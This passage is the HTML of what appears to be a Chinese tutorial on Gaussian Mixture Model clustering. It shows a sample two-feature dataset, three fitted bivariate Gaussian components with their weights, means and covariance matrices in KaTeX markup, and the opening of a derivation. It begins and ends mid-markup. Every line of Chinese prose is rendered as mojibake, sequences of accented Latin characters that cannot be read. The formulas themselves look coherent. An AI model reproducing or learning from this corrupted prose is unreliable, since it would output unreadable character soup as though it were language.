style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></p>
<hr/>
<p>åŸºäºå‰é¢ä»‹ç»çš„ç†è®ºåŸºç¡€ï¼Œç°åœ¨æˆ‘ä»¬å°±ä»¥äºŒç»´æ¦‚ç‡åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span> ä¸ºä¾‹ï¼Œæ¥å¯è§†åŒ–æ¼”ç¤ºå¦‚ä½•ç”¨å¤šä¸ªé«˜æ–¯åˆ†å¸ƒå¯¹å…¶é€¼è¿‘ä¸åˆ†è§£ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç±»åˆ†è§£<strong>å¹¶ä¸åƒæ³°å‹’å±•å¼€é‚£æ ·å­˜åœ¨ç¡®å®šçš„æ•°å­¦è§£æè§£</strong>ã€‚ç”±äºæˆ‘ä»¬é¢å¯¹çš„æ˜¯ä¸€ä¸ªç”±å¤šä¸ªé«˜æ–¯æˆåˆ†å åŠ è€Œæˆçš„æ··åˆæ¨¡å‹ï¼Œå…¶å‚æ•°ä¼°è®¡é—®é¢˜æ²¡æœ‰é—­å¼è§£ï¼Œé€šå¸¸åªèƒ½é€šè¿‡<strong>è¿­ä»£ä¼˜åŒ–</strong>çš„æ–¹æ³•å¯»æ‰¾ä¼¼ç„¶å‡½æ•°çš„ä¸€ä¸ªå±€éƒ¨æœ€ä¼˜è§£ã€‚è€Œè¿™ä¸ªè¿­ä»£ä¼˜åŒ–æ–¹æ³•çš„åç§°å°±æ˜¯<strong>é«˜æ–¯æ··åˆæ¨¡å‹ï¼ˆGMMï¼‰èšç±»ç®—æ³•</strong></p>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€æ— æ³•ç›´æ¥è·å¾—çœŸå®åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span> çš„è§£æå½¢å¼ï¼Œè€Œæ˜¯é€šè¿‡é‡‡æ ·è·å¾—æœ‰é™çš„æ•°æ®æ ·æœ¬ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬é€šè¿‡è§‚æµ‹é‡‡æ ·å¾—åˆ°å¦‚ä¸‹æ•°æ®é›†ï¼š</p>



































<table><thead><tr><th>æ ·æœ¬</th><th>ç‰¹å¾1</th><th>ç‰¹å¾2</th></tr></thead><tbody><tr><td>æ ·æœ¬1</td><td>0.6</td><td>1.1</td></tr><tr><td>æ ·æœ¬2</td><td>3.6</td><td>2.5</td></tr><tr><td>æ ·æœ¬3</td><td>2.8</td><td>3.3</td></tr><tr><td>æ ·æœ¬4</td><td>0.1</td><td>2.7</td></tr><tr><td>...</td><td/><td/></tr></tbody></table>
<p>å°†å…¨éƒ¨æ•°æ®ç»˜åˆ¶åœ¨äºŒç»´å¹³é¢ä¸Šï¼Œå¯å¾—åˆ°å¦‚ä¸‹æ•£ç‚¹å›¾ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c00dd313476f461ebc7fa0f9a83f6bda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=r%2F53pTNApyrm0t9AnGxZCc154Ko%3D" alt="c7.jpg" loading="lazy"/></p>
<p>ä»æ•£ç‚¹å›¾ä¸­è™½ç„¶éš¾ä»¥ç²¾ç¡®åˆ¤æ–­æ•°æ®åº”ç”±å‡ ä¸ªäºŒå…ƒé«˜æ–¯åˆ†å¸ƒæ··åˆè€Œæˆï¼Œä½†å¯å¤§è‡´è§‚å¯Ÿåˆ°æ•°æ®ä¼¼ä¹å›´ç»•<strong>ä¸‰ä¸ªä¸­å¿ƒ</strong>èšé›†ã€‚å› æ­¤ï¼Œæˆ‘ä»¬<strong>å‡è®¾</strong>æ··åˆæˆåˆ†æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">k = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3</span></span></span></span></span>ï¼Œå¹¶è¿ç”¨ GMM èšç±»ç®—æ³•å¯¹è¯¥åˆ†å¸ƒè¿›è¡Œæ‹Ÿåˆåˆ†è§£ã€‚ç®—æ³•è¿è¡Œåï¼Œæˆ‘ä»¬å¾—åˆ°ä¸‰ä¸ªäºŒå…ƒé«˜æ–¯åˆ†å¸ƒçš„å‚æ•°ä¼°è®¡ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0.4</mn><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ£</mo><mo stretchy="false">[</mo><mn>0.04</mn><mo separator="true">,</mo><mn>0.04</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mn>0.29</mn><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ£</mo><mo stretchy="false">[</mo><mn>1.92</mn><mo separator="true">,</mo><mn>3.18</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mn>0.31</mn><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ£</mo><mo stretchy="false">[</mo><mo>âˆ’</mo><mn>0.98</mn><mo separator="true">,</mo><mn>2.03</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x}) = 0.4 \mathcal{N}(\mathbf{x} \mid  [0.04,0.04],\Sigma_1) + 0.29 \mathcal{N}(\mathbf{x} \mid  [1.92,3.18],\Sigma_2)+0.31 \mathcal{N}(\mathbf{x} \mid  [-0.98,2.03],\Sigma_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.4</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.04</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.04</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.29</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">1.92</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">3.18</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.31</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">âˆ’</span><span class="mord">0.98</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2.03</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mn>1</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\Sigma_1 = \begin{bmatrix}
 1 &amp; 0.8\\
 0.8 &amp;1
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mn>2</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1.5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mn>0.6</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mn>0.6</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1.5</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\Sigma_2 = \begin{bmatrix}
 1.5 &amp; -0.6\\
-0.6 &amp;1.5
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1.5</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord">0.6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord">0.6</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1.5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mn>3</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0.8</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\Sigma_3 = \begin{bmatrix}
 0.8 &amp; 0\\
0 &amp;0.8
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0.8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></div>
<p>å¯è§†åŒ–åå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e78a986956a049219c6f2f817d0f6d1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=OdEVfUEWAZWDnrETYFCBh5yC%2Fc0%3D" alt="c8.jpg" loading="lazy"/></p>
<hr/>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ·±å…¥è®²è§£GMMèšç±»ç®—æ³•çš„æ•°å­¦æµç¨‹ã€‚å¦‚æœä½ å¯¹ä¸‹é¢çš„æ•°å­¦å…¬å¼æ„Ÿåˆ°å¤´å¤§ï¼Œä¹Ÿä¸å¿…æ‹…å¿ƒï¼Œä½ å¯ä»¥ç›´æ¥è·³è¿‡è¿™ä¸€å°èŠ‚ï¼Œå»å­¦ä¹ GMMèšç±»ç®—æ³•çš„å·¥å…·åº“ã€‚æ¯•ç«Ÿåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªè¦ä¼šç”¨å·¥å…·å°±è¡Œäº†ï¼Œæ²¡å¿…è¦çŸ¥é“å·¥å…·æ˜¯å¦‚ä½•è¿ä½œçš„ã€‚ä½†æ˜¯å¦‚æœæœ‰èƒ½åŠ›çš„è¯ï¼Œè¿˜æ˜¯æ¨èä½ å°è¯•ç†è§£ä¸€ä¸‹ï¼Œçœ‹çœ‹åˆ«äººçš„è®¾è®¡æ€æƒ³ï¼Œä»¥åè‡ªå·±è®¾è®¡æ–°ç®—æ³•æˆ–è¿›è¡Œç†è®ºåˆ›æ–°æ—¶ä¹Ÿæœ‰ä¸ªå‚è€ƒã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å« <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span> ä¸ª <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> ç»´æ ·æœ¬çš„æ•°æ®é›† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi><mo>=</mo><mrow><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></msup></mrow></mrow><annotation encoding="application/x-tex">\mathbf{X} = {\mathbf{x}^{(1)}, \mathbf{x}^{(2)}, ..., \mathbf{x}^{(m)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6861em;"/><span class="mord mathbf">X</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">m</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºå½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span> çš„çŸ©é˜µã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å°†æ•°æ®åˆ†å¸ƒåˆ†è§£ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> ä¸ª <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> ç»´é«˜æ–¯åˆ†å¸ƒçš„çº¿æ€§ç»„åˆã€‚è®°ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> ä¸ªé«˜æ–¯åˆ†å¸ƒä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ£</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mathbf{x} \mid \boldsymbol{\mu}_j, \Sigma_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1302em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" 